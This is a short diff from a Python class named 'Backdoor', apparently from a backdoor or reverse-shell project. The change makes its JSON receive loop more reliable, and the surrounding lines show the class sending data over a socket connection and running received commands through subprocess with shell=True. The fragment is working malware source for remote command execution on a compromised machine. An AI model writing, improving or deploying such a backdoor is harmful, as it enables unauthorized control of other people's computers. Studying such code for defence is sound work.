@@ -13,8 +13,13 @@ class Backdoor:
 		self.connection.send(json_data)
 
 	def reliable_receive(self):
-		json_data = self.connection.recv(1024)
-		return json.loads(json_data)
+		json_data = ""
+		while True:
+			try:
+				json_data += self.connection.recv(1024)
+				return json.loads(json_data)
+			except ValueError:
+				continue
 
 	def execute_system_command(self, command):
 		return subprocess.check_output(command, shell=True)
